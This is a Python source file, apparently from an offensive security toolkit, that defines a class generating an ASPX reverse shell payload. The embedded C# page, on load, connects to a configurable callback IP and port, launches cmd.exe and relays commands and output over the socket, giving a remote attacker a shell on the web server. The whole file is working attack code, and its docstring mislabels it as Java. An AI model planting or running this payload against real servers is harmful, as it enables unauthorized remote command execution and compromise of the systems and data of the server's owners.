import os
from shellcode import Shellcode

class AspxShellcode(Shellcode):
    """
        Class with shellcodes for java language
    """
    def __init__(self, connectback_ip='localhost', connectback_port=5555,
                 badchars=['\x00']):
        Shellcode.__init__(self, connectback_ip=connectback_ip, connectback_port=connectback_port, badchars=badchars)

    def get_reverse(self, inline=False):
        """ Function to get aspx reverse shellcode """
        if not self.CONNECTBACK_IP or not self.CONNECTBACK_PORT:
            print ("Settings for connectback listener must be defined")
            return False
        aspx = """
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Principal" %>

<script runat="server">
	static NetworkStream socketStream;
    protected void CallbackShell(string server, int port)
    {
    	System.Net.Sockets.TcpClient clientSocket = new System.Net.Sockets.TcpClient();
    	clientSocket.Connect(server, port);
    	socketStream = clientSocket.GetStream();

    	Byte[] bytes = new Byte[8192];
    	String data = null;

    	Process CmdProc;
        CmdProc = new Process();
        CmdProc.StartInfo.FileName = "cmd";
        CmdProc.StartInfo.UseShellExecute = false;
        CmdProc.StartInfo.RedirectStandardInput = true;
        CmdProc.StartInfo.RedirectStandardOutput = true;
        CmdProc.StartInfo.RedirectStandardError = true;

        CmdProc.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
        CmdProc.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);

        CmdProc.Start();
        CmdProc.BeginOutputReadLine();
        CmdProc.BeginErrorReadLine();
        StreamWriter sortStreamWriter = CmdProc.StandardInput;
        int i;
        while ((i = socketStream.Read(bytes, 0, bytes.Length)) != 0)
        {
            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            if (data == "exit")
            	break;
            sortStreamWriter.WriteLine(data.Trim());
        }
        clientSocket.Close();
        CmdProc.Close();
    }

    public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        string[] SplitData = outLine.Data.Split('\\n');
        foreach (string s in SplitData)
        {
             byte[] msg = System.Text.Encoding.ASCII.GetBytes(s + "\\r\\n");
             socketStream.Write(msg, 0, msg.Length);
        }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
    	CallbackShell("LOCALHOST", LOCALPORT);
    }

</script>"""
        if inline:
            aspx = self.make_inline(aspx)
        aspx = aspx.replace("LOCALHOST", str(self.CONNECTBACK_IP)).replace("LOCALPORT", str(self.CONNECTBACK_PORT))
        return aspx

    def get_shellcode(self, inline=False):
        return self.get_reverse(inline)
